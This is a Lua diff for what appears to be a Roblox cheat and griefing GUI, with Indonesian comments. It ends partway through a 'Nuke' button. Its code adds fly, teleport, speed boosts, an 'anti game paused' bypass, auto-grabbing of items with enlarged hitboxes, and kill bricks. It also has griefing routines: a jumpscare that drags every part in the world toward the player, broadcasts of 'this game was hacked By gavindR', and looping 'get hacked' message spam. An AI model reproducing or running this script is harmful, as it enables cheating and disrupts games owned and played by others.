+-- Attachment & VectorForce
+local attach = Instance.new("Attachment", rootPart)
+local vforce = Instance.new("VectorForce")
+vforce.Attachment0 = attach
+vforce.RelativeTo = Enum.ActuatorRelativeTo.World
+vforce.Parent = rootPart
+
+RunService:BindToRenderStep("REAL_FLY", Enum.RenderPriority.Character.Value, function()
+	if flyEnabled then
+		
+		local camCFrame = camera.CFrame
+		local input = humanoid.MoveDirection
+
+		-- arah sesuai kamera
+		local forward = Vector3.new(camCFrame.LookVector.X, 0, camCFrame.LookVector.Z).Unit
+		local right = Vector3.new(camCFrame.RightVector.X, 0, camCFrame.RightVector.Z).Unit
+
+		-- hitung arah gerak
+		local move = (forward * input.Z) + (right * input.X)
+
+		if move.Magnitude > 0 then
+			move = move.Unit
+		end
+
+		-- ⭐ Ini yang bikin bisa TERBANG:
+		--   - Tambah gaya ke atas KONSTAN biar tidak jatuh
+		--   - Tambah gaya gerak arah W A S D
+		vforce.Force = (move * speed * 120) + Vector3.new(0, 300, 0)
+
+		-- Mode A = badan menghadap arah kamera
+		if mode == "A" then
+			rootPart.CFrame = CFrame.lookAt(rootPart.Position, rootPart.Position + camCFrame.LookVector)
+		end
+
+	else
+		vforce.Force = Vector3.new(0,0,0)
+	end
+end)
+
+-- ================ telejejkekek ===
+--// GUI Posisi + Teleport Tween Aman (Seat + Copy)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+
+-- Auto update HRP setelah respawn
+player.CharacterAdded:Connect(function(newChar)
+	character = newChar
+	hrp = newChar:WaitForChild("HumanoidRootPart")
+end)
+
+-- GUI setup
+
+local frame = Instance.new("Frame", Frameeeee2)
+frame.Size = UDim2.new(0, 320, 0, 200)
+frame.Position = UDim2.new(0, -230, 0, -200)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+local font = Enum.Font.GothamBold
+
+-- Title
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "📍 Posisi Player + Teleport Aman"
+title.Font = font
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextSize = 18
+
+-- Posisi Label
+local posisiLabel = Instance.new("TextLabel", frame)
+posisiLabel.Size = UDim2.new(1, 0, 0, 30)
+posisiLabel.Position = UDim2.new(0, 0, 0, 35)
+posisiLabel.BackgroundTransparency = 1
+posisiLabel.Text = "(X, Y, Z): Loading..."
+posisiLabel.Font = font
+posisiLabel.TextColor3 = Color3.fromRGB(200,255,200)
+posisiLabel.TextSize = 18
+
+-- TextBox input koordinat
+local textBox = Instance.new("TextBox", frame)
+textBox.Size = UDim2.new(0, 280, 0, 35)
+textBox.Position = UDim2.new(0, 20, 0, 75)
+textBox.PlaceholderText = "Contoh: 0, 10, 0"
+textBox.Font = font
+textBox.TextColor3 = Color3.fromRGB(255,255,255)
+textBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+textBox.TextSize = 18
+textBox.ClearTextOnFocus = false
+
+-- Tombol Copy posisi
+local copyButton = Instance.new("TextButton", frame)
+copyButton.Size = UDim2.new(0, 130, 0, 35)
+copyButton.Position = UDim2.new(0, 20, 0, 120)
+copyButton.Text = "📋 Copy Posisi"
+copyButton.Font = font
+copyButton.TextSize = 16
+copyButton.TextColor3 = Color3.fromRGB(255,255,255)
+copyButton.BackgroundColor3 = Color3.fromRGB(100, 180, 100)
+
+-- Tombol Teleport
+local tpButton = Instance.new("TextButton", frame)
+tpButton.Size = UDim2.new(0, 130, 0, 35)
+tpButton.Position = UDim2.new(0, 170, 0, 120)
+tpButton.Text = "🚀 Teleport (Tween)"
+tpButton.Font = font
+tpButton.TextSize = 16
+tpButton.TextColor3 = Color3.fromRGB(255,255,255)
+tpButton.BackgroundColor3 = Color3.fromRGB(80,180,255)
+
+-- Status label
+local statusLabel = Instance.new("TextLabel", frame)
+statusLabel.Size = UDim2.new(1, 0, 0, 20)
+statusLabel.Position = UDim2.new(0, 0, 0, 165)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = font
+statusLabel.TextColor3 = Color3.fromRGB(255,255,100)
+statusLabel.TextSize = 16
+statusLabel.Text = ""
+
+-- Tween + Seat teleport
+local function teleportTweenAman(pos)
+	if not hrp or not hrp.Parent then return end
+
+	-- Buat seat sementara agar tidak jatuh
+	local seat = Instance.new("Seat")
+	seat.Size = Vector3.new(4, 1, 4)
+	seat.Anchored = true
+	seat.CanCollide = true
+	seat.Name = "TweenSeat"
+	seat.Position = pos + Vector3.new(0, -2.5, 0) -- dudukan sedikit di bawah
+	seat.Parent = workspace
+
+	-- Tween HRP ke posisi
+	local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+	local tween = TweenService:Create(hrp, tweenInfo, {CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))})
+	tween:Play()
+
+	-- Setelah sampai, hapus seat setelah 1.5 detik
+	task.delay(1e2, function()
+		if seat and seat.Parent then
+			seat:Destroy()
+		end
+	end)
+end
+
+-- Tombol Teleport ditekan
+tpButton.MouseButton1Click:Connect(function()
+	local text = textBox.Text
+	local x, y, z = text:match("([-0-9%.]+)%s*,%s*([-0-9%.]+)%s*,%s*([-0-9%.]+)")
+	if x and y and z then
+		local target = Vector3.new(tonumber(x), tonumber(y), tonumber(z))
+		statusLabel.Text = "Teleporting..."
+		teleportTweenAman(target)
+		task.delay(1, function() statusLabel.Text = "✔️ Teleport Selesai!" end)
+	else
+		statusLabel.Text = "❌ Format salah! Contoh: 0, 10, 0"
+	end
+end)
+
+-- Tombol Copy posisi ditekan
+copyButton.MouseButton1Click:Connect(function()
+	if hrp and hrp.Parent then
+		local p = hrp.Position
+		local text = string.format("%.1f, %.1f, %.1f", p.X, p.Y, p.Z)
+		textBox.Text = text
+		statusLabel.Text = "📋 Posisi disalin ke kotak input!"
+	end
+end)
+
+-- Update posisi player real-time
+RunService.RenderStepped:Connect(function()
+	if hrp and hrp.Parent then
+		local pos = hrp.Position
+		posisiLabel.Text = string.format("(X, Y, Z): %.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z)
+	end
+end)
+
+
+-- Tombol close
+createButton("Destroy ui", UDim2.new(0, 8, 0, 8), function()
+LocalPlayer.PlayerGui.gavindR_glitch:Destroy()
+LocalPlayer.PlayerGui.PatrickFade:Destroy()
+LocalPlayer.PlayerGui.Screamer:Destroy()
+wait(5)
+screenGui:Destroy()
+end)
+
+
+-- ================== ushsjejsjje
+
+createButton("Patrick script", UDim2.new(0, 8, 0, 68), function()
+-- ======================= Patrick Horror Script =======================
+-- require id 12102103065
+
+
+-- 🧱 Model utama Patrick
+local aa191 = Instance.new("Folder", Workspace) 
+aa191.Name = "Patrick(require)"
+
+local olo = Instance.new("Folder", aa191) 
+olo.Name= "Sound"
+
+-- 🎵 Suara utama (lagu horror)
+local a = Instance.new("Sound")
+a.Name = "SongOfHealing"
+a.SoundId = "rbxassetid://9046435309"
+a.Pitch = 1
+a.Looped = true
+a.Volume = 2
+a.Parent = olo
+
+local aa = Instance.new("Model", aa191)
+aa.Name = "Patrick"
+
+-- ?? Suara tertawa seram
+local b = Instance.new("Sound")
+b.Name = "Laughter"
+b.SoundId = "rbxassetid://7816195044"
+b.Pitch = 0.423
+b.Looped = true
+b.Volume = 0.6
+b.Parent = olo
+
+-- 🧍 Mesh Patrick
+
+local c = Instance.new("MeshPart")
+c.Name = "PatrickChar"
+c.Parent = aa
+c.MeshId = "rbxassetid://455783801"
+c.TextureID = "rbxassetid://455783804"
+c.Material = Enum.Material.Granite
+c.Color = Color3.fromRGB(255,205,205)
+c.Size = Vector3.new(1.120108, 1, 1.065613)
+c.Anchored = true
+c.CanCollide = false
+c.CanQuery = false
+c.Position = hrp.Position + Vector3.new(0, -76.4, 0) 
+
+-- ✅ daftar gambar & sisi
+
+-- ?? Mulut Patrick
+local mouth = Instance.new("Part")
+mouth.Name = "Mouth"
+mouth.Position = c.Position + Vector3.new(0, 102, 0) 
+mouth.Size = Vector3.new(4, 1, 2)
+mouth.Transparency = 1
+mouth.Anchored = false
+mouth.Parent = c
+
+local s = Instance.new("Script", c)
+s.Name = "Giver"
+local ss = Instance.new("Script", s)
+ss.Name = "Float"
+local obj = Instance.new("ObjectValue", ss)
+obj.Name = "Patrick"
+local lcs = Instance.new("LocalScript", ss)
+lcs.Name = "GuiStuff"
+
+-- 🔩 Weld ke Patrick
+local weld = Instance.new("WeldConstraint", mouth)
+weld.Part0 = mouth
+weld.Part1 = c
+
+-- ?? Cahaya merah
+local light = Instance.new("PointLight", mouth)
+light.Color = Color3.fromRGB(255,0,0)
+light.Brightness = 40
+light.Range = 100
+
+local light = Instance.new("PointLight", c)
+light.Color = Color3.fromRGB(255,0,0)
+light.Brightness = 40
+light.Range = 100
+
+
+local id = {
+    "rbxassetid://10644190121",
+    "rbxassetid://6279708028",
+    "rbxassetid://10644188768",
+    "rbxassetid://10644190121",
+    "rbxassetid://10644190121",
+    "rbxassetid://10644190121"
+}
+
+local Faces = {
+    Enum.NormalId.Front,
+    Enum.NormalId.Back,
+    Enum.NormalId.Back,
+    Enum.NormalId.Left,
+    Enum.NormalId.Top,
+    Enum.NormalId.Right
+}
+
+-- ✅ buat semua decal
+for i = 1, #Faces do
+    local decal = Instance.new("Decal")
+    decal.Face = Faces[i]
+    decal.Texture = id[i]
+    decal.Parent = c
+end
+
+-- 🔊 Play suara
+
+
+-- 🌈 Tween Patrick ke atas (keluar dari tanah)
+TweenService:Create(c, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
+	Position = c.Position + Vector3.new(0, 176.4, 0)
+}):Play()
+
+local Lighting = game:GetService("Lighting")
+        Lighting.TimeOfDay = 0
+        Lighting.Ambient = Color3.fromRGB(0, 0, 0)
+        Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
+        
+        local Atmosphere = Lighting:FindFirstChildWhichIsA("Atmosphere")
+        if (Atmosphere) then
+            Atmosphere:Destroy()
+        end
+
+a:Play()
+b:Play()
+
+wait(10)
+-- ================== TARIK SEMUA OBJEK KE MULUT ==================
+task.spawn(function()
+	task.wait(2)
+	local target = mouth.Position
+	local allParts = {}
+
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and obj ~= patrick and obj ~= mouth then
+			table.insert(allParts, obj)
+		end
+	end
+
+	-- Termasuk player sendiri
+	table.insert(allParts, hrp)
+
+	for _, part in ipairs(allParts) do
+		pcall(function()
+			local tween = TweenService:Create(part, TweenInfo.new(8, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+				Position = target + Vector3.new(math.random(-1,1), math.random(-1,1), math.random(-1,1))
+			})
+			tween:Play()
+		end)
+	end
+
+	-- Setelah semua ditarik → layar gelap & jumpscare
+	task.wait(15.5)
+	local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+	gui.Name = "PatrickFade"
+	gui.IgnoreGuiInset = true
+
+	local frame = Instance.new("Frame", gui)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	frame.Size = UDim2.new(1, 0, 1, 0)
+	frame.BackgroundTransparency = 1
+
+	for i = 1, 50 do
+		frame.BackgroundTransparency = 1 - (i / 50)
+		task.wait(0.05)
+	end
+
+	jumpscare:Play()
+end)
+end) 
+
+createButton("killbrick", UDim2.new(0, 8, 0, 128), function()
+gyat = Instance.new("Part",workspace)
+gyat.Name = "The kill brick of team gyat"
+gyat.Anchored = true
+gyat.Position = player.Character.HumanoidRootPart.Position + Vector3.new(5, 0 , 0) 
+gyat.Material = "Neon"
+gyat.Color = Color3.new(1, 0 , 0) 
+
+gyat.Touched:Connect(function(hit)
+    local character = hit.Parent
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    
+    if humanoid then
+        humanoid.Health = 0
+    end
+end)
+end) 
+
+createButton("Healbrick", UDim2.new(0, 1308, 0, 488), function()
+ggyat = Instance.new("Part",workspace)
+ggyat.Name = "The kill brick of team gyat"
+ggyat.Anchored = true
+ggyat.Position = player.Character.HumanoidRootPart.Position + Vector3.new(5, 0 , 0) 
+ggyat.Material = "Neon"
+ggyat.Color = Color3.new(0, 1 , 0) 
+
+ggyat.Touched:Connect(function(hit)
+    local character = hit.Parent
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    
+    if humanoid then
+        humanoid.Health = math.huge
+    end
+end)
+end) 
+
+createButton("Click tp", UDim2.new(0, 1408, 0, 488), function()
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+
+-- Buat tool
+local tool = Instance.new("Tool")
+tool.Name = "ClickTeleport"
+tool.RequiresHandle = false
+tool.Parent = player:WaitForChild("Backpack")
+
+tool.Activated:Connect(function()
+    local unitRay = mouse.UnitRay
+    local params = RaycastParams.new()
+    params.FilterDescendantsInstances = {player.Character}
+    params.FilterType = Enum.RaycastFilterType.Exclude
+
+    local result = workspace:Raycast(unitRay.Origin, unitRay.Direction * 10000, params)
+
+    if result then
+        local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame = CFrame.new(result.Position + Vector3.new(0, 5.3, 0))
+        end
+    end
+end)
+end) 
+
+createButton("Walkspeed Fast", UDim2.new(0, 1108, 0, 488), function()
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hum = char:WaitForChild("Humanoid")
+
+hum.WalkSpeed = 65
+
+
+end) 
+
+
+createButton("Bypass Anti Game Paused", UDim2.new(0, 1108, 0, 548), function()
+local RunService = game:GetService("RunService")
+
+RunService.RenderStepped:Connect(function()
+game.Players.LocalPlayer.GameplayPaused = false
+end)
+end) 
+
+createButton("auto no fog", UDim2.new(0, 1208, 0, 548), function()
+local lighting = game:GetService("Lighting")
+
+lighting.FogEnd = 100000000
+
+end) 
+
+createButton("auto no glich", UDim2.new(0, 1308, 0, 548), function()
+local lighting = game:GetService("Lighting")
+
+local atmos = lighting:FindFirstChildOfClass("Atmosphere")
+if atmos then
+	atmos.Density = 0
+	atmos.Offset = 0
+	atmos.Glare = 0
+	atmos.Haze = 0
+end
+
+-- Hilangkan ColorCorrection
+for _, v in ipairs(lighting:GetChildren()) do
+	if v:IsA("ColorCorrectionEffect") then
+		v.Enabled = false
+	end
+end
+
+-- Hilangkan Bloom
+for _, v in ipairs(lighting:GetChildren()) do
+	if v:IsA("BloomEffect") then
+		v.Enabled = false
+	end
+end
+
+-- Hilangkan Blur
+for _, v in ipairs(lighting:GetChildren()) do
+	if v:IsA("BlurEffect") then
+		v.Size = 0
+		v.Enabled = false
+	end
+end
+end) 
+
+createButton("auto get tool + hitbox", UDim2.new(0, 1408, 0, 548), function()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function getChar()
+	return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+end
+
+local CHARACTER = getChar()
+local HRP = CHARACTER:WaitForChild("HumanoidRootPart")
+
+-- Daftar nama giver (nama bisa ada di awalan / belakang)
+local GIVER_NAMES = {
+	"giver",
+	"item",
+	"itemstand",
+	"box"
+}
+
+-- Cek apakah nama objek cocok dengan giver names
+local function isGiverName(name)
+	name = name:lower()
+	for _, key in ipairs(GIVER_NAMES) do
+		if string.find(name, key:lower()) then
+			return true
+		end
+	end
+	return false
+end
+
+-- Ambil BasePart dari Model atau objek lain
+local function getPart(obj)
+	if obj:IsA("BasePart") then
+		return obj
+	end
+
+	if obj:IsA("Model") then
+		return obj:FindFirstChildWhichIsA("BasePart")
+	end
+
+	return nil
+end
+
+-- Tambahkan SelectionBox
+local function addSelectionBox(part)
+	if not part then return end
+
+	local sb = Instance.new("SelectionBox")
+	sb.Adornee = part
+	sb.LineThickness = 0.05
+	sb.SurfaceColor3 = Color3.fromRGB(0,255,0)
+	sb.Color3 = Color3.fromRGB(0,255,0)
+	sb.Parent = part
+
+	task.delay(1.5, function()
+		if sb then sb:Destroy() end
+	end)
+end
+
+-- Teleport ke giver
+local function teleportTo(part)
+	if HRP and part then
+		HRP.CFrame = part.CFrame + Vector3.new(0, 3, 0)
+	end
+end
+
+-- Resize tool + anti glitch
+local function fixTool(tool)
+	if not tool:FindFirstChild("Handle") then return end
+
+	local h = tool.Handle
+	h.Size = Vector3.new(20, 40, 20)
+	h.Massless = true
+	h.CanCollide = false
+end
+
+LocalPlayer.Backpack.ChildAdded:Connect(function(t)
+	if t:IsA("Tool") then fixTool(t) end
+end)
+CHARACTER.ChildAdded:Connect(function(t)
+	if t:IsA("Tool") then fixTool(t) end
+end)
+
+----------------------------------------------------
+--              PROSES UTAMA
+----------------------------------------------------
+
+local givers = {}
+
+-- Cari semua objek yang namanya sesuai
+for _, obj in pairs(workspace:GetDescendants()) do
+	if isGiverName(obj.Name) then
+		local part = getPart(obj)
+		if part then
+			table.insert(givers, part)
+		end
+	end
+end
+
+-- Teleport satu per satu sampai habis
+task.spawn(function()
+	for _, part in ipairs(givers) do
+		addSelectionBox(part)
+		teleportTo(part)
+		task.wait(0.09) -- kasih delay kecil biar aman
+	end
+end)
+end) 
+
+createButton("HIDE", UDim2.new(0, 1508, 0, 548), function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function createPart(size, cframe, parent)
+    local part = Instance.new("Part")
+    part.Size = size
+    part.CFrame = cframe
+    part.Anchored = true
+    part.Material = Enum.Material.WoodPlanks
+    part.BrickColor = BrickColor.new("Reddish brown")
+    part.CanCollide = true
+    part.Parent = parent
+    return part
+end
+
+    task.wait(0.1)
+
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    -- Model lemari khusus player ini saja
+    local lemari = Instance.new("Model")
+    lemari.Name = "Lemari_OnlyForMe"
+
+    local width = 8
+    local height = 16
+    local depth = 7
+    local thickness = 0.5
+
+    local baseCFrame = hrp.CFrame * CFrame.new(0, -((height/2) - 12.7), 0)
+
+    createPart(Vector3.new(width, height, thickness), baseCFrame * CFrame.new(0, 0, -depth/2), lemari)
+    createPart(Vector3.new(thickness, height, depth), baseCFrame * CFrame.new(width/2, 0, 0), lemari)
+    createPart(Vector3.new(thickness, height, depth), baseCFrame * CFrame.new(-width/2, 0, 0), lemari)
+    createPart(Vector3.new(width, thickness, depth), baseCFrame * CFrame.new(0, height/2, 0), lemari)
+    createPart(Vector3.new(width, thickness, depth), baseCFrame * CFrame.new(0, -height/2 + 3, 0), lemari)
+
+    local door = createPart(Vector3.new(width, height, thickness), baseCFrame * CFrame.new(0, 0, depth/2), lemari)
+    door.Name = "Door"
+
+    local prompt = Instance.new("ProximityPrompt")
+    prompt.ActionText = "Buka / Tutup"
+    prompt.ObjectText = "Pintu Lemari"
+    prompt.HoldDuration = 0
+    prompt.MaxActivationDistance = 25
+    prompt.Parent = door
+
+    local isOpen = false
+    prompt.Triggered:Connect(function()
+        isOpen = not isOpen
+        door.CanCollide = not isOpen
+        door.Transparency = isOpen and 0.6 or 0
+    end)
+
+    -- Karena ini LocalScript → lemari hanya terlihat player sendiri
+    lemari.Parent = workspace
+end) 
+
+createButton("Update HIDE", UDim2.new(0, 1608, 0, 548), function()
+    local character = player.Character
+if character and character:FindFirstChild("HumanoidRootPart") then
+    local hrp = character.HumanoidRootPart
+    
+    -- update posisi pusat lemari baru
+    local newBaseCFrame = hrp.CFrame * CFrame.new(0, -((height/2) - 12.7), 0)
+
+    for _, part in ipairs(lemari:GetChildren()) do
+        if part:IsA("BasePart") then
+            
+            -- hitung offset yang benar
+            local offset = baseCFrame:ToObjectSpace(part.CFrame)
+            
+            -- pasang kembali part dengan offset sama ke posisi baru
+            part.CFrame = newBaseCFrame:ToWorldSpace(offset)
+        end
+    end
+    
+    -- simpan base baru
+    baseCFrame = newBaseCFrame
+end
+
+end) 
+
+createButton("Announcemen script", UDim2.new(0, 8, 0, 188), function()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+-- Fungsi bikin GUI announcement dengan tween
+local function makeAnnouncement(senderName, message)
+	for _, v in pairs(Players:GetPlayers()) do
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "AnnouncementGui"
+		gui.ResetOnSpawn = false
+		gui.Parent = v:WaitForChild("PlayerGui")
+
+		-- Frame pengumuman
+		local frame = Instance.new("Frame")
+		frame.Size = UDim2.new(0.6, 0, 0.12, 0)
+		frame.Position = UDim2.new(0.2, 0, 1.2, 0) -- mulai dari bawah layar
+		frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		frame.BackgroundTransparency = 0.4
+		frame.BorderSizePixel = 0
+		frame.Parent = gui
+
+		-- Tulisan di dalam frame
+        local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, 0, 1, 0)
+		label.BackgroundTransparency = 1
+		label.TextScaled = true
+		label.TextColor3 = Color3.fromRGB(255, 255, 255)
+		label.Font = Enum.Font.GothamBold
+		label.Text = "this game was hacked By gavindR"
+		label.Parent = frame
+
+		-- Tween naik ke atas
+		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
+		local tweenUp = TweenService:Create(frame, tweenInfo, {Position = UDim2.new(0.2, 0, 0.04, 0)})
+		tweenUp:Play()
+
+		-- Tunggu 4 detik, lalu tween turun dan hapus GUI
+		task.delay(10, function()
+			local tweenDown = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Position = UDim2.new(0.2, 0, 1.2, 0)})
+			tweenDown:Play()
+			tweenDown.Completed:Wait()
+			gui:Destroy()
+		end)
+	end
+end
+
+-- Contoh: player lokal kirim pengumuman
+local localPlayer = Players.LocalPlayer
+makeAnnouncement(localPlayer.Name, "?this game bypassed e by gavindR!")
+end) 
+
+createButton("Disco", UDim2.new(0, 108, 0, 8), function()
+local Lighting = game:GetService("Lighting")
+		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
+        ColorCorrection.Brightness = 0.5
+
+
+
+		function zigzag(X) 
+			return math.acos(math.cos(X*math.pi))/math.pi
+		end
+
+		Counter = 0
+
+		Lighting.TimeOfDay = "12:00"
+
+		while wait(0.1) do 
+			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
+			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
+			Counter += 0.01
+		end
+end) 
+
+createButton("Message", UDim2.new(0, 108, 0, 68), function()
+local shit = true
+
+
+while shit do
+wait(0.1) 
+
+local msg = Instance.new("Message",workspace) 
+msg.Text = "lmao get hacked by gavindR"
+wait(0.1)
+msg:Remove()
+end
+end) 
+
+-- 🟢 LocalScript di StarterPlayerScripts
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local PhysicsService = game:GetService("PhysicsService")
+local player = Players.LocalPlayer
+
+_G.SafeZone27Size = Vector3.new(12,500,12)
+
+-- GUI input ukuran
+local frame = Instance.new("Frame", Frameeeee2)
+frame.Size = UDim2.new(0, 220, 0, 90)
+frame.Position = UDim2.new(0.5, 220, 0.5, -62)
+frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+frame.BackgroundTransparency = 0.2
+
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(1,-10,0.6,0)
+box.Position = UDim2.new(0,5,0,5)
+box.PlaceholderText = "Ukuran X,Y,Z (misal: 5,20,10)"
+box.Text = ""
+box.TextScaled = true
+box.BackgroundColor3 = Color3.fromRGB(50,50,50)
+box.TextColor3 = Color3.fromRGB(255,255,255)
+box.ClearTextOnFocus = false
+
+local btn = Instance.new("TextButton", frame)
+btn.Size = UDim2.new(1,-10,0.35,0)
+btn.Position = UDim2.new(0,5,0.65,0)
+btn.Text = "Apply"
+btn.TextScaled = true
+btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
+btn.TextColor3 = Color3.new(1,1,1)
+
+btn.MouseButton1Click:Connect(function()
+	local text = box.Text
+	if text and text ~= "" then
+		local nums = {}
+		for num in string.gmatch(text,"%d+") do
+			table.insert(nums,tonumber(num))
+		end
+		if #nums == 3 then
+			_G.SafeZone27Size = Vector3.new(nums[1],nums[2],nums[3])
+		end
+	end
+end)
+
+-- 🔹 GUI kanan atas daftar Humanoid
+local listFrame = Instance.new("Frame", Frameeeee2)
+listFrame.Name = 'listHumanoid'
+listFrame.AnchorPoint = Vector2.new(1,0)
+listFrame.Position = UDim2.new(0.5, 86, 0.5, -7)
+listFrame.Size = UDim2.new(0,200,0,250)
+listFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+
+local listLabel = Instance.new("TextLabel", listFrame)
+listLabel.Size = UDim2.new(1,0,0,25)
+listLabel.Text = "🧍 Detected Humanoids"
+listLabel.TextScaled = true
+listLabel.BackgroundColor3 = Color3.fromRGB(0,255,0)
+listLabel.TextColor3 = Color3.new(0,0,0)
+
+local scrolling = Instance.new("ScrollingFrame", listFrame)
+scrolling.Size = UDim2.new(1,0,1,-25)
+scrolling.Position = UDim2.new(0,0,0,25)
+scrolling.CanvasSize = UDim2.new(0,0,0,0)
+scrolling.BackgroundTransparency = 1
+scrolling.ScrollBarThickness = 6
+
+local function updateList(models)
+	if not scrolling or not scrolling.Parent then return end
+	scrolling:ClearAllChildren()
+	local y = 0
+	for _,m in ipairs(models) do
+		local lbl = Instance.new("TextLabel", scrolling)
+		lbl.Size = UDim2.new(1,0,0,20)
+		lbl.Position = UDim2.new(0,0,0,y)
+		lbl.TextScaled = true
+		lbl.BackgroundTransparency = 0.5
+		lbl.BackgroundColor3 = Color3.fromRGB(60,60,60)
+		lbl.TextColor3 = Color3.new(1,1,1)
+		lbl.Text = m.Name
+		y += 22
+	end
+	scrolling.CanvasSize = UDim2.new(0,0,0,y)
+end
+
+-- 🟩 FORCEFIELD
+createButton("FORCEFIELD", UDim2.new(0, 1228, 0, 408), function()
+	local function waitForCharacter()
+		local char = player.Character
+		while not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") do
+			char = player.Character or player.CharacterAdded:Wait()
+			task.wait()
+		end
+		return char
+	end
+
+	local function createSafeZone27(character)
+		local hrp = character:WaitForChild("HumanoidRootPart")
+
+		local safeZone27 = Instance.new("Part")
+		safeZone27.Name = 'SafeZone27'
+		safeZone27.Anchored = true
+		safeZone27.CanCollide = false
+		safeZone27.Color = Color3.fromRGB(0,255,0)
+		safeZone27.Size = _G.SafeZone27Size
+		safeZone27.Material = Enum.Material.ForceField
+		safeZone27.Transparency = 0.4
+		safeZone27.Parent = workspace
+
+		local selection = Instance.new("SelectionBox")
+		selection.Adornee = safeZone27
+		selection.Color3 = Color3.fromRGB(0, 170, 255)
+		selection.LineThickness = 0.05
+		selection.Parent = safeZone27
+
+		local crySound = Instance.new("Sound")
+		crySound.SoundId = "rbxassetid://5135809265"
+		crySound.Volume = 2
+		crySound.Looped = false
+		crySound.Parent = safeZone27
+
+		local function isPlayerModel(model)
+			for _, plr in ipairs(Players:GetPlayers()) do
+				if plr.Character == model then return true end
+			end
+			return false
+		end
+
+		local function isAllowedModel(model)
+			if isPlayerModel(model) then return true end
+			if model:IsDescendantOf(workspace.CurrentCamera) then return true end
+			return false
+		end
+
+		local function pushBack(model)
+local hrp2 = model:FindFirstChild("HumanoidRootPart")  
+			if not hrp2 then return end  
+			local dir = (hrp2.Position - safeZone27.Position)  
+			if dir.Magnitude == 0 then return end  
+			hrp2.CFrame = CFrame.new(hrp2.Position + dir.Unit * math.random(3.1,6.1))  
+			local s = crySound:Clone()  
+			s.Parent = safeZone27  
+			s:Play()  
+			game.Debris:AddItem(s,5)  
+		end
+
+		-- dorong NPC yang nyentuh SafeZone
+		safeZone27.Touched:Connect(function(hit)
+			local model = hit.Parent
+			if model and model:FindFirstChildOfClass("Humanoid") and not isAllowedModel(model) then
+				pushBack(model)
+			end
+		end)
+
+		-- cek terus NPC di sekitar SafeZone
+		task.spawn(function()
+			while safeZone27.Parent do
+				local detected = {}
+				for _, npcH in ipairs(workspace:GetDescendants()) do
+					if npcH:IsA("Humanoid") and npcH.Parent and not isAllowedModel(npcH.Parent) then
+						local npcHRP = npcH.Parent:FindFirstChild("HumanoidRootPart")
+						if npcHRP then
+							local diff = npcHRP.Position - hrp.Position
+							if math.abs(diff.X) < _G.SafeZone27Size.X/2 and
+							   math.abs(diff.Y) < _G.SafeZone27Size.Y/2 and
+							   math.abs(diff.Z) < _G.SafeZone27Size.Z/2 then
+								pushBack(npcH.Parent)
+								table.insert(detected, npcH.Parent)
+							end
+						end
+					end
+				end
+				updateList(detected)
+				task.wait(0.05)
+			end
+		end)
+
+		RunService.RenderStepped:Connect(function()
+			if safeZone27 and safeZone27.Parent and hrp then
+				safeZone27.CFrame = hrp.CFrame * CFrame.new(0, _G.SafeZone27Size.Y/2 - 5, 0)
+				safeZone27.Size = _G.SafeZone27Size
+			end
+		end)
+
+		character:WaitForChild("Humanoid").Died:Connect(function()
+			if safeZone27 then safeZone27:Destroy() end
+		end)
+	end
+
+	task.spawn(function()
+		createSafeZone27(waitForCharacter())
+	end)
+
+	player.CharacterAdded:Connect(function(char)
+		task.wait(1)
+		createSafeZone27(char)
+	end)
+end)
+
+-- 🟥 UNFORCEFIELD (hapus semua SafeZone27)
+createButton("Unforcefield", UDim2.new(0, 1128, 0, 408), function()
+	for _, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") and v.Name == "SafeZone27" then
+			v:Destroy()
+		end
+	end
+	print("✅ Semua SafeZone27 sudah dihapus dan sistem ForceField dinonaktifkan.")
+end)
+
+createButton("Nuke", UDim2.new(0, 708, 0, 368), function()
